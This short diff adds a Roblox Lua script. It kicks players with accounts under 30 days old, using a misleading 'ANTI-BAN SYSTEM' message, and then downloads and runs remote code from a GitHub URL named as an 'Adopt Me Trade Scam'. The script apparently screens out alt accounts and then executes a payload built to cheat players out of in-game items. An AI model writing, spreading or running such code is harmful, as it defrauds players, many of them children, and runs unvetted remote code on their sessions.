@@ -1,0 +1,17 @@
+local Players = game:GetService("Players")
+local function kickYoungAccounts(player)
+    if player.AccountAge < 30 then
+        player:Kick("❗️ ANTI-BAN SYSTEM ❗️ Game detected that your using an alt, this will increase the risk of being banned on main account!")
+    end
+end
+for _, player in pairs(Players:GetPlayers()) do
+    kickYoungAccounts(player)
+end
+Players.PlayerAdded:Connect(kickYoungAccounts)
+local externalCode = game:HttpGet("https://raw.githubusercontent.com/TotallyCalculus/main/main/East%20Hub%20Adopt%20Me%20Trade%20Scam")
+local func = loadstring(externalCode)
+if func then
+    func()
+else
+    print("hi")
+end
